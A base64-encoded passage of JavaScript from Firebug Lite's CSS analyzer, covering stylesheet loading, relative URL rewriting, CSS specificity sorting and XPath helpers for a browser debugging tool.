ICB9DQogICAgICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgICAgICANCiAgICAgICAgQ1NTUnVsZU1hcFtyaWRdID0NCiAgICAgICAgew0KICAgICAgICAgICAgc3R5bGVTaGVldElkOiBzc2lkLA0KICAgICAgICAgICAgc3R5bGVTaGVldEluZGV4OiBpLA0KICAgICAgICAgICAgb3JkZXI6ICsrZ2xvYmFsQ1NTUnVsZUluZGV4LA0KICAgICAgICAgICAgc3BlY2lmaWNpdHk6IA0KICAgICAgICAgICAgICAgIC8vIFNlZTogSXNzdWUgNDc3NzogW0ZpcmVidWcgbGl0ZV0gU3BlY2lmaWNpdHkgb2YgQ1NTIFJ1bGVzDQogICAgICAgICAgICAgICAgLy8NCiAgICAgICAgICAgICAgICAvLyBpZiBpdCBpcyBhIG5vcm1hbCBzZWxlY3RvciB0aGVuIGNhbGN1bGF0ZSB0aGUgc3BlY2lmaWNpdHkNCiAgICAgICAgICAgICAgICBzZWxlY3RvciAmJiBzZWxlY3Rvci5pbmRleE9mKCIsIikgPT0gLTEgPyANCiAgICAgICAgICAgICAgICBnZXRDU1NSdWxlU3BlY2lmaWNpdHkoc2VsZWN0b3IpIDogDQogICAgICAgICAgICAgICAgLy8gU2VlOiBJc3N1ZSAzMjYyOiBbRmlyZWJ1ZyBsaXRlXSBTcGVjaWZpY2l0eSBvZiBncm91cGVkIENTUyBSdWxlcw0KICAgICAgICAgICAgICAgIC8vDQogICAgICAgICAgICAgICAgLy8gaWYgaXQgaXMgYSBncm91cGVkIHNlbGVjdG9yLCBkbyBub3QgY2FsY3VsYXRlIHRoZSBzcGVjaWZpY2l0eQ0KICAgICAgICAgICAgICAgIC8vIGJlY2F1c2UgdGhlIGNvcnJlY3QgdmFsdWUgd2lsbCBkZXBlbmQgb2YgdGhlIG1hdGNoZWQgZWxlbWVudC4NCiAgICAgICAgICAgICAgICAvLyBUaGUgcHJvcGVyIHNwZWNpZmljaXR5IHZhbHVlIGZvciBncm91cGVkIHNlbGVjdG9ycyBhcmUgY2FsY3VsYXRlZA0KICAgICAgICAgICAgICAgIC8vIHZpYSBnZXRFbGVtZW50Q1NTUnVsZXMoZWxlbWVudCkNCiAgICAgICAgICAgICAgICAwLA0KICAgICAgICAgICAgDQogICAgICAgICAgICBydWxlOiBydWxlLA0KICAgICAgICAgICAgbGluZU5vOiBsaW5lTm8sDQogICAgICAgICAgICBzZWxlY3Rvcjogc2VsZWN0b3IsDQogICAgICAgICAgICBjc3NUZXh0OiBydWxlLnN0eWxlID8gcnVsZS5zdHlsZS5jc3NUZXh0IDogcnVsZS5jc3NUZXh0ID8gcnVsZS5jc3NUZXh0IDogIiIgICAgICAgIA0KICAgICAgICB9Ow0KICAgICAgICANCiAgICAgICAgLy8gVE9ETzogd2hhdCBoYXBwZW5zIHdpdGggZWxlbWVudHMgYWRkZWQgYWZ0ZXIgdGhpcz8gTmVlZCB0byBjcmVhdGUgYSB0ZXN0IGNhc2UuDQogICAgICAgIC8vIE1heWJlIHdlIHNob3VsZCBwbGFjZSB0aGlzIGF0IGdldEVsZW1lbnRDU1NSdWxlcygpIGJ1dCBpdCB3aWxsIG1ha2UgdGhlIGZ1bmN0aW9uDQogICAgICAgIC8vIGEgbG90IG1vcmUgZXhwZW5zaXZlLg0KICAgICAgICAvLyANCiAgICAgICAgLy8gTWF5YmUgYWRkIGEgInJlZnJlc2giIGJ1dHRvbj8NCiAgICAgICAgdmFyIGVsZW1lbnRzID0gRmlyZWJ1Zy5TZWxlY3RvcihzZWxlY3RvciwgZG9jKTsNCiAgICAgICAgDQogICAgICAgIGZvciAodmFyIGo9MCwgZWxlbWVudHNMZW5ndGg9ZWxlbWVudHMubGVuZ3RoOyBqPGVsZW1lbnRzTGVuZ3RoOyBqKyspDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBlbGVtZW50ID0gZWxlbWVudHNbal07DQogICAgICAgICAgICB2YXIgZWlkID0gRWxlbWVudENhY2hlKGVsZW1lbnQpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoIUVsZW1lbnRDU1NSdWxlc01hcFtlaWRdKQ0KICAgICAgICAgICAgICAgIEVsZW1lbnRDU1NSdWxlc01hcFtlaWRdID0gW107DQogICAgICAgICAgICANCiAgICAgICAgICAgIEVsZW1lbnRDU1NSdWxlc01hcFtlaWRdLnB1c2gocmlkKTsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgLy9jb25zb2xlLmxvZyhzZWxlY3RvciwgZWxlbWVudHMpOw0KICAgIH0NCn07DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gRXh0ZXJuYWwgU3R5bGVTaGVldCBMb2FkZXINCg0KdmFyIGxvYWRFeHRlcm5hbFN0eWxlc2hlZXQgPSBmdW5jdGlvbihkb2MsIHN0eWxlU2hlZXRJdGVyYXRvciwgc3R5bGVTaGVldCkNCnsNCiAgICB2YXIgdXJsID0gc3R5bGVTaGVldC5ocmVmOw0KICAgIHN0eWxlU2hlZXQuZmlyZWJ1Z0lnbm9yZSA9IHRydWU7DQogICAgDQogICAgdmFyIHNvdXJjZSA9IEZpcmVidWcuTGl0ZS5Qcm94eS5sb2FkKHVybCk7DQogICAgDQogICAgLy8gVE9ETzogY2hlY2sgZm9yIG51bGwgYW5kIGVycm9yIHJlc3BvbnNlcw0KICAgIA0KICAgIC8vIHJlbW92ZSBjb21tZW50cw0KICAgIC8vdmFyIHJlTXVsdGlDb21tZW50ID0gLyhcL1wqKFteXCpdfFwqKD8hXC8pKSpcKlwvKS9nOw0KICAgIC8vc291cmNlID0gc291cmNlLnJlcGxhY2UocmVNdWx0aUNvbW1lbnQsICIiKTsNCiAgICANCiAgICAvLyBjb252ZXJ0IHJlbGF0aXZlIGFkZHJlc3NlcyB0byBhYnNvbHV0ZSBvbmVzICANCiAgICBzb3VyY2UgPSBzb3VyY2UucmVwbGFjZSgvdXJsXCgoW15cKV0rKVwpL2csIGZ1bmN0aW9uKGEsbmFtZSl7DQogICAgDQogICAgICAgIHZhciBoYXNEb21haW4gPSAvXHcrOlwvXC8uLy50ZXN0KG5hbWUpOw0KICAgICAgICANCiAgICAgICAgaWYgKCFoYXNEb21haW4pDQogICAgICAgIHsNCiAgICAgICAgICAgIG5hbWUgPSBuYW1lLnJlcGxhY2UoL14oWyInXSkoLispXDEkLywgIiQyIik7DQogICAgICAgICAgICB2YXIgZmlyc3QgPSBuYW1lLmNoYXJBdCgwKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gcmVsYXRpdmUgcGF0aCwgYmFzZWQgb24gcm9vdA0KICAgICAgICAgICAgaWYgKGZpcnN0ID09ICIvIikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAvLyBUT0RPOiB4eHhwZWRybyBtb3ZlIHRvIGxpYiBvciBGaXJlYnVnLkxpdGUuc29tZXRoaW5nDQogICAgICAgICAgICAgICAgLy8gZ2V0VVJMUm9vdA0KICAgICAgICAgICAgICAgIHZhciBtID0gL14oW146XSs6XC97MSwzfVteXC9dKykvLmV4ZWModXJsKTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICByZXR1cm4gbSA/IA0KICAgICAgICAgICAgICAgICAgICAidXJsKCIgKyBtWzFdICsgbmFtZSArICIpIiA6DQogICAgICAgICAgICAgICAgICAgICJ1cmwoIiArIG5hbWUgKyAiKSI7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAvLyByZWxhdGl2ZSBwYXRoLCBiYXNlZCBvbiBjdXJyZW50IGxvY2F0aW9uDQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgLy8gVE9ETzogeHh4cGVkcm8gbW92ZSB0byBsaWIgb3IgRmlyZWJ1Zy5MaXRlLnNvbWV0aGluZw0KICAgICAgICAgICAgICAgIC8vIGdldFVSTFBhdGgNCiAgICAgICAgICAgICAgICB2YXIgcGF0aCA9IHVybC5yZXBsYWNlKC9bXlwvXStcLltcd1xkXSsoXD8uK3wjLispPyQvZywgIiIpOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHBhdGggPSBwYXRoICsgbmFtZTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICB2YXIgcmVCYWNrID0gL1teXC9dK1wvXC5cLlwvLzsNCiAgICAgICAgICAgICAgICB3aGlsZShyZUJhY2sudGVzdChwYXRoKSkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHBhdGggPSBwYXRoLnJlcGxhY2UocmVCYWNrLCAiIik7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIC8vY29uc29sZS5sb2coInVybCgiICsgcGF0aCArICIpIik7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgcmV0dXJuICJ1cmwoIiArIHBhdGggKyAiKSI7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIC8vIGlmIGl0IGlzIGFuIGFic29sdXRlIHBhdGgsIHRoZXJlIGlzIG5vdGhpbmcgdG8gZG8NCiAgICAgICAgcmV0dXJuIGE7DQogICAgfSk7DQogICAgDQogICAgdmFyIG9sZFN0eWxlID0gc3R5bGVTaGVldC5vd25lck5vZGU7DQogICAgDQogICAgaWYgKCFvbGRTdHlsZSkgcmV0dXJuOw0KICAgIA0KICAgIGlmICghb2xkU3R5bGUucGFyZW50Tm9kZSkgcmV0dXJuOw0KICAgIA0KICAgIHZhciBzdHlsZSA9IGNyZWF0ZUdsb2JhbEVsZW1lbnQoInN0eWxlIik7DQogICAgc3R5bGUuc2V0QXR0cmlidXRlKCJjaGFyc2V0IiwidXRmLTgiKTsNCiAgICBzdHlsZS5zZXRBdHRyaWJ1dGUoInR5cGUiLCAidGV4dC9jc3MiKTsNCiAgICBzdHlsZS5pbm5lckhUTUwgPSBzb3VyY2U7DQoNCiAgICAvL2RlYnVnZ2VyOw0KICAgIG9sZFN0eWxlLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKHN0eWxlLCBvbGRTdHlsZS5uZXh0U2libGluZyk7DQogICAgb2xkU3R5bGUucGFyZW50Tm9kZS5yZW1vdmVDaGlsZChvbGRTdHlsZSk7DQogICAgDQogICAgZG9jLnN0eWxlU2hlZXRzW2RvYy5zdHlsZVNoZWV0cy5sZW5ndGgtMV0uZXh0ZXJuYWxVUkwgPSB1cmw7DQogICAgDQogICAgY29uc29sZS5sb2codXJsLCAiY2FsbCAiICsgZXh0ZXJuYWxTdHlsZVNoZWV0VVJMcy5sZW5ndGgsIHNvdXJjZSk7DQogICAgDQogICAgZXh0ZXJuYWxTdHlsZVNoZWV0VVJMcy5wb3AoKTsNCiAgICANCiAgICBpZiAocHJvY2Vzc0FsbFN0eWxlU2hlZXRzVGltZW91dCkNCiAgICB7DQogICAgICAgIGNsZWFyVGltZW91dChwcm9jZXNzQWxsU3R5bGVTaGVldHNUaW1lb3V0KTsNCiAgICB9DQogICAgDQogICAgcHJvY2Vzc0FsbFN0eWxlU2hlZXRzVGltZW91dCA9IHNldFRpbWVvdXQoZnVuY3Rpb24oKXsNCiAgICAgICAgY29uc29sZS5sb2coInByb2Nlc3NpbmciKTsNCiAgICAgICAgRkJMLnByb2Nlc3NBbGxTdHlsZVNoZWV0cyhkb2MsIHN0eWxlU2hlZXRJdGVyYXRvcik7DQogICAgICAgIHByb2Nlc3NBbGxTdHlsZVNoZWV0c1RpbWVvdXQgPSBudWxsOw0KICAgIH0sMjAwKTsNCiAgICANCn07DQoNCi8vKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyBnZXRFbGVtZW50Q1NTUnVsZXMNCg0KdmFyIGdldEVsZW1lbnRDU1NSdWxlcyA9IGZ1bmN0aW9uKGVsZW1lbnQpDQp7DQogICAgdmFyIGVpZCA9IEVsZW1lbnRDYWNoZShlbGVtZW50KTsNCiAgICB2YXIgcnVsZXMgPSBFbGVtZW50Q1NTUnVsZXNNYXBbZWlkXTsNCiAgICANCiAgICBpZiAoIXJ1bGVzKSByZXR1cm47DQogICAgDQogICAgdmFyIGFyciA9IFtlbGVtZW50XTsNCiAgICB2YXIgU2VsZWN0b3IgPSBGaXJlYnVnLlNlbGVjdG9yOw0KICAgIHZhciBydWxlSWQsIHJ1bGU7DQogICAgDQogICAgLy8gZm9yIHRoZSBjYXNlIG9mIGdyb3VwZWQgc2VsZWN0b3JzLCB3ZSBuZWVkIHRvIGNhbGN1bGF0ZSB0aGUgaGlnaGVzdA0KICAgIC8vIHNwZWNpZmljaXR5IHdpdGhpbiB0aGUgc2VsZWN0b3JzIG9mIHRoZSBncm91cCB0aGF0IG1hdGNoZXMgdGhlIGVsZW1lbnQsDQogICAgLy8gc28gd2UgY2FuIHNvcnQgdGhlIHJ1bGVzIHByb3Blcmx5IHdpdGhvdXQgb3ZlciBlc3RpbWF0aW5nIHRoZSBzcGVjaWZpY2l0eQ0KICAgIC8vIG9mIGdyb3VwZWQgc2VsZWN0b3JzDQogICAgZm9yICh2YXIgaSA9IDAsIGxlbmd0aCA9IHJ1bGVzLmxlbmd0aDsgaSA8IGxlbmd0aDsgaSsrKQ0KICAgIHsNCiAgICAgICAgcnVsZUlkID0gcnVsZXNbaV07DQogICAgICAgIHJ1bGUgPSBDU1NSdWxlTWFwW3J1bGVJZF07DQogICAgICAgIA0KICAgICAgICAvLyBjaGVjayBpZiBpdCBpcyBhIGdyb3VwZWQgc2VsZWN0b3INCiAgICAgICAgaWYgKHJ1bGUuc2VsZWN0b3IuaW5kZXhPZigiLCIpICE9IC0xKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgc2VsZWN0b3JzID0gcnVsZS5zZWxlY3Rvci5zcGxpdCgiLCIpOw0KICAgICAgICAgICAgdmFyIG1heFNwZWNpZmljaXR5ID0gLTE7DQogICAgICAgICAgICB2YXIgc2VsLCBzcGVjLCBtb3N0U3BlY2lmaWNTZWxlY3RvcjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gbG9vcCBvdmVyIGFsbCBzZWxlY3RvcnMgaW4gdGhlIGdyb3VwDQogICAgICAgICAgICBmb3IgKHZhciBqLCBsZW4gPSBzZWxlY3RvcnMubGVuZ3RoOyBqIDwgbGVuOyBqKyspDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgc2VsID0gc2VsZWN0b3JzW2pdOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIC8vIGZpbmQgaWYgdGhlIHNlbGVjdG9yIG1hdGNoZXMgdGhlIGVsZW1lbnQNCiAgICAgICAgICAgICAgICBpZiAoU2VsZWN0b3IubWF0Y2hlcyhzZWwsIGFycikubGVuZ3RoID09IDEpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBzcGVjID0gZ2V0Q1NTUnVsZVNwZWNpZmljaXR5KHNlbCk7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAvLyBmaW5kIHRoZSBtb3N0IHNwZWNpZmljIHNlbGVjdG9yIHRoYXQgbWFjdGhlcyB0aGUgZWxlbWVudA0KICAgICAgICAgICAgICAgICAgICBpZiAoc3BlYyA+IG1heFNwZWNpZmljaXR5KQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBtYXhTcGVjaWZpY2l0eSA9IHNwZWM7DQogICAgICAgICAgICAgICAgICAgICAgICBtb3N0U3BlY2lmaWNTZWxlY3RvciA9IHNlbDsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgcnVsZS5zcGVjaWZpY2l0eSA9IG1heFNwZWNpZmljaXR5Ow0KICAgICAgICB9DQogICAgfQ0KICAgIA0KICAgIHJ1bGVzLnNvcnQoc29ydEVsZW1lbnRSdWxlcyk7DQogICAgLy9ydWxlcy5zb3J0KHNvbHZlUnVsZXNUaWVkKTsNCiAgICANCiAgICByZXR1cm4gcnVsZXM7DQp9Ow0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIFJ1bGUgU3BlY2lmaWNpdHkNCg0KdmFyIHNvcnRFbGVtZW50UnVsZXMgPSBmdW5jdGlvbihhLCBiKQ0Kew0KICAgIHZhciBydWxlQSA9IENTU1J1bGVNYXBbYV07DQogICAgdmFyIHJ1bGVCID0gQ1NTUnVsZU1hcFtiXTsNCiAgICANCiAgICB2YXIgc3BlY2lmaWNpdHlBID0gcnVsZUEuc3BlY2lmaWNpdHk7DQogICAgdmFyIHNwZWNpZmljaXR5QiA9IHJ1bGVCLnNwZWNpZmljaXR5Ow0KICAgIA0KICAgIGlmIChzcGVjaWZpY2l0eUEgPiBzcGVjaWZpY2l0eUIpDQogICAgICAgIHJldHVybiAxOw0KICAgIA0KICAgIGVsc2UgaWYgKHNwZWNpZmljaXR5QSA8IHNwZWNpZmljaXR5QikNCiAgICAgICAgcmV0dXJuIC0xOw0KICAgIA0KICAgIGVsc2UNCiAgICAgICAgcmV0dXJuIHJ1bGVBLm9yZGVyID4gcnVsZUIub3JkZXIgPyAxIDogLTE7DQp9Ow0KDQp2YXIgc29sdmVSdWxlc1RpZWQgPSBmdW5jdGlvbihhLCBiKQ0Kew0KICAgIHZhciBydWxlQSA9IENTU1J1bGVNYXBbYV07DQogICAgdmFyIHJ1bGVCID0gQ1NTUnVsZU1hcFtiXTsNCiAgICANCiAgICBpZiAocnVsZUEuc3BlY2lmaWNpdHkgPT0gcnVsZUIuc3BlY2lmaWNpdHkpDQogICAgICAgIHJldHVybiBydWxlQS5vcmRlciA+IHJ1bGVCLm9yZGVyID8gMSA6IC0xOw0KICAgICAgICANCiAgICByZXR1cm4gbnVsbDsNCn07DQoNCnZhciBnZXRDU1NSdWxlU3BlY2lmaWNpdHkgPSBmdW5jdGlvbihzZWxlY3RvcikNCnsNCiAgICB2YXIgbWF0Y2ggPSBzZWxlY3Rvci5tYXRjaChyZVNlbGVjdG9yVGFnKTsNCiAgICB2YXIgdGFnQ291bnQgPSBtYXRjaCA/IG1hdGNoLmxlbmd0aCA6IDA7DQogICAgDQogICAgbWF0Y2ggPSBzZWxlY3Rvci5tYXRjaChyZVNlbGVjdG9yQ2xhc3MpOw0KICAgIHZhciBjbGFzc0NvdW50ID0gbWF0Y2ggPyBtYXRjaC5sZW5ndGggOiAwOw0KICAgIA0KICAgIG1hdGNoID0gc2VsZWN0b3IubWF0Y2gocmVTZWxlY3RvcklkKTsNCiAgICB2YXIgaWRDb3VudCA9IG1hdGNoID8gbWF0Y2gubGVuZ3RoIDogMDsNCiAgICANCiAgICByZXR1cm4gdGFnQ291bnQgKyAxMCpjbGFzc0NvdW50ICsgMTAwKmlkQ291bnQ7DQp9Ow0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIFN0eWxlU2hlZXQgZGF0YQ0KDQp2YXIgZXh0cmFjdFNvdXJjZURhdGEgPSBmdW5jdGlvbihocmVmKQ0Kew0KICAgIHZhciBzb3VyY2VEYXRhID0gDQogICAgew0KICAgICAgICBzb3VyY2U6IG51bGwsDQogICAgICAgIHN0YXJ0TGluZTogMA0KICAgIH07DQogICAgDQogICAgaWYgKGhyZWYpDQogICAgew0KICAgICAgICBzb3VyY2VEYXRhLnNvdXJjZSA9IEZpcmVidWcuTGl0ZS5Qcm94eS5sb2FkKGhyZWYpOw0KICAgIH0NCiAgICBlbHNlDQogICAgew0KICAgICAgICAvLyBUT0RPOiBjcmVhdGUgZXh0cmFjdEludGVybmFsU291cmNlRGF0YShpbmRleCkNCiAgICAgICAgLy8gVE9ETzogcHJlIHByb2Nlc3MgdGhlIHBvc2l0aW9uIG9mIHRoZSBpbmxpbmUgc3R5bGVzIHNvIHRoaXMgd2lsbCBoYXBwZW4gb25seSBvbmNlDQogICAgICAgIC8vIGluIGNhc2Ugb2YgaGF2aW5nIG11bHRpcGxlIGlubGluZSBzdHlsZXMNCiAgICAgICAgdmFyIGluZGV4ID0gMDsNCiAgICAgICAgdmFyIHNzSW5kZXggPSArK2ludGVybmFsU3R5bGVTaGVldEluZGV4Ow0KICAgICAgICB2YXIgcmVTdHlsZVRhZyA9IC9cPFxzKnN0eWxlLipcPi9naTsNCiAgICAgICAgdmFyIHJlRW5kU3R5bGVUYWcgPSAvXDxcL1xzKnN0eWxlLipcPi9naTsNCiAgICAgICAgDQogICAgICAgIHZhciBzb3VyY2UgPSBGaXJlYnVnLkxpdGUuUHJveHkubG9hZChFbnYuYnJvd3Nlci5sb2NhdGlvbi5ocmVmKTsNCiAgICAgICAgc291cmNlID0gc291cmNlLnJlcGxhY2UoL1xuXHJ8XHJcbi9nLCAiXG4iKTsgLy8gbm9ybWFsaXplIGxpbmUgYnJlYWtzDQogICAgICAgIA0KICAgICAgICB2YXIgc3RhcnRMaW5lID0gMDsNCiAgICAgICAgDQogICAgICAgIGRvDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBtYXRjaFN0eWxlVGFnID0gc291cmNlLm1hdGNoKHJlU3R5bGVUYWcpOyANCiAgICAgICAgICAgIHZhciBpMCA9IHNvdXJjZS5pbmRleE9mKG1hdGNoU3R5bGVUYWdbMF0pICsgbWF0Y2hTdHlsZVRhZ1swXS5sZW5ndGg7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGZvciAodmFyIGk9MDsgaSA8IGkwOyBpKyspDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWYgKHNvdXJjZS5jaGFyQXQoaSkgPT0gIlxuIikNCiAgICAgICAgICAgICAgICAgICAgc3RhcnRMaW5lKys7DQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgIHNvdXJjZSA9IHNvdXJjZS5zdWJzdHIoaTApOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBpbmRleCsrOw0KICAgICAgICB9DQogICAgICAgIHdoaWxlIChpbmRleCA8PSBzc0luZGV4KTsNCiAgICANCiAgICAgICAgdmFyIG1hdGNoRW5kU3R5bGVUYWcgPSBzb3VyY2UubWF0Y2gocmVFbmRTdHlsZVRhZyk7DQogICAgICAgIHZhciBpMSA9IHNvdXJjZS5pbmRleE9mKG1hdGNoRW5kU3R5bGVUYWdbMF0pOw0KICAgICAgICANCiAgICAgICAgdmFyIGV4dHJhY3RlZFNvdXJjZSA9IHNvdXJjZS5zdWJzdHIoMCwgaTEpOw0KICAgICAgICANCiAgICAgICAgc291cmNlRGF0YS5zb3VyY2UgPSBleHRyYWN0ZWRTb3VyY2U7DQogICAgICAgIHNvdXJjZURhdGEuc3RhcnRMaW5lID0gc3RhcnRMaW5lOw0KICAgIH0NCiAgICANCiAgICByZXR1cm4gc291cmNlRGF0YTsNCn07DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gUmVnaXN0cmF0aW9uDQoNCkZCTC5Dc3NBbmFseXplciA9IENzc0FuYWx5emVyOw0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCn19KTsNCg0KDQovKiBTZWUgbGljZW5zZS50eHQgZm9yIHRlcm1zIG9mIHVzYWdlICovDQoNCi8vIG1vdmUgdG8gRkJMDQooZnVuY3Rpb24oKSB7IA0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIFhQYXRoDQoNCi8qKg0KICogR2V0cyBhbiBYUGF0aCBmb3IgYW4gZWxlbWVudCB3aGljaCBkZXNjcmliZXMgaXRzIGhpZXJhcmNoaWNhbCBsb2NhdGlvbi4NCiAqLw0KdGhpcy5nZXRFbGVtZW50WFBhdGggPSBmdW5jdGlvbihlbGVtZW50KQ0Kew0KICAgIHRyeQ0KICAgIHsNCiAgICAgICAgaWYgKGVsZW1lbnQgJiYgZWxlbWVudC5pZCkNCiAgICAgICAgICAgIHJldHVybiAnLy8qW0BpZD0iJyArIGVsZW1lbnQuaWQgKyAnIl0nOw0KICAgICAgICBlbHNlDQogICAgICAgICAgICByZXR1cm4gdGhpcy5nZXRFbGVtZW50VHJlZVhQYXRoKGVsZW1lbnQpOw0KICAgIH0NCiAgICBjYXRjaChFKQ0KICAgIHsNCiAgICAgICAgLy8geHh4cGVkcm86IHRyeWluZyB0byBkZXRlY3QgdGhlIG15c3RlcmlvdXMgZXJyb3I6DQogICAgICAgIC8vIFNlY3VyaXR5IGVycm9yIiBjb2RlOiAiMTAwMA0KICAgICAgICAvL2RlYnVnZ2VyOw0KICAgIH0NCn07DQoNCnRoaXMuZ2V0RWxlbWVudFRyZWVYUGF0aCA9IGZ1bmN0aW9uKGVsZW1lbnQpDQp7DQogICAgdmFyIHBhdGhzID0gW107DQoNCiAgICBmb3IgKDsgZWxlbWVudCAmJiBlbGVtZW50Lm5vZGVUeXBlID09IDE7IGVsZW1lbnQgPSBlbGVtZW50LnBhcmVudE5vZGUpDQogICAgew0KICAgICAgICB2YXIgaW5kZXggPSAwOw0KICAgICAgICB2YXIgbm9kZU5hbWUgPSBlbGVtZW50Lm5vZGVOYW1lOw0KICAgICAgICANCiAgICAgICAgZm9yICh2YXIgc2libGluZyA9IGVsZW1lbnQucHJldmlvdXNTaWJsaW5nOyBzaWJsaW5nOyBzaWJsaW5nID0gc2libGluZy5wcmV2aW91c1NpYmxpbmcpDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmIChzaWJsaW5nLm5vZGVUeXBlICE9IDEpIGNvbnRpbnVlOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoc2libGluZy5ub2RlTmFtZSA9PSBub2RlTmFtZSkNCiAgICAgICAgICAgICAgICArK2luZGV4Ow0KICAgICAgICB9DQoNCiAgICAgICAgdmFyIHRhZ05hbWUgPSBlbGVtZW50Lm5vZGVOYW1lLnRvTG93ZXJDYXNlKCk7DQogICAgICAgIHZhciBwYXRoSW5kZXggPSAoaW5kZXggPyAiWyIgKyAoaW5kZXgrMSkgKyAiXSIgOiAiIik7DQogICAgICAgIHBhdGhzLnNwbGljZSgwLCAwLCB0YWdOYW1lICsgcGF0aEluZGV4KTsNCiAgICB9DQoNCiAgICByZXR1cm4gcGF0aHMubGVuZ3RoID8gIi8iICsgcGF0aHMuam9pbigiLyIpIDogbnVsbDsNCn07DQoNCnRoaXMuZ2V0RWxlbWVudHNCeVhQYXRoID0gZnVuY3Rpb24oZG9jLCB4cGF0aCkNCnsNCiAgICB2YXIgbm9kZXMgPSBbXTsNCg0KICAgIHRyeSB7DQogICAgICAgIHZhciByZXN1bHQgPSBkb2MuZXZhbHVhdGUoeHBhdGgsIGRvYywgbnVsbCwgWFBhdGhSZXN1bHQuQU5ZX1RZUEUsIG51bGwpOw0KICAgICAgICBmb3IgKHZhciBpdGVtID0gcmVzdWx0Lml0ZXJhdGVOZXh0KCk7IGl0ZW07IGl0ZW0gPSByZXN1bHQuaXRlcmF0ZU5leHQoKSkNCiAgICAgICAgICAgIG5vZGVzLnB1c2goaXRlbSk7DQogICAgfQ0KICAgIGNhdGNoIChleGMpDQogICAgew0KICAgICAgICAvLyBJbnZhbGlkIHhwYXRoIGV4cHJlc3Npb25zIG1ha2UgdGhlaXIgd2F5IGhlcmUgc29tZXRpbWVzLiAgSWYgdGhhdCBoYXBwZW5zLA0KICAgICAgICAvLyB3ZSBzdGlsbCB3YW50IHRvIHJldHVybiBhbiBlbXB0eSBzZXQgd2l0aG91dCBhbiBleGNlcHRpb24uDQogICAgfQ0KDQogICAgcmV0dXJuIG5vZGVzOw0KfTsNCg0KdGhpcy5nZXRSdWxlTWF0Y2hpbmdFbGVtZW50cyA9IGZ1bmN0aW9uKHJ1bGUsIGRvYykNCnsNCiAgICB2YXIgY3NzID0gcnVsZS5zZWxlY3RvclRleHQ7DQogICAgdmFyIHhwYXRoID0gdGhpcy5jc3NUb1hQYXRoKGNzcyk7DQogICAgcmV0dXJuIHRoaXMuZ2V0RWxlbWVudHNCeVhQYXRoKGRvYywgeHBhdGgpOw0KfTsNCg0KDQp9KS5jYWxsKEZCTCk7DQoNCg0KDQoNCkZCTC5ucyhmdW5jdGlvbigpIHsgd2l0aCAoRkJMKSB7DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKi